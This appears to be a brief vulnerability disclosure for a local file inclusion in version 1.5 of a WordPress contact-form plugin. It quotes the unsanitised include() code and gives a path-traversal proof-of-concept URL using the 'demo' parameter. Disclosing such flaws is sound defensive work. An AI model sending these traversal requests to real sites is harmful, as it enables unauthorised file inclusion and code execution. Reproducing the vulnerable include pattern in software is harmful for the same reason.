# Version: 1.5
# Tested on: Windows/Linux

The affected file is /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php
it include the file /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/helpers/demo.php
and at the line 23-26 are the inclusion.


			$file = LIB_PATH . '/filters/' . $name . '.php';
			if (!file_exists($file))
				throw new Exception("Invalid demo: {$name}");
			include($file);


The exploit can be used like that : /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php?demo=../test
This version would include the test.php file in the same directory because we need to back navigate from the directory ./filters/../test.php
Now we can include all php files on the system.

Proof of concept : http://localhost/wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php?demo=../test
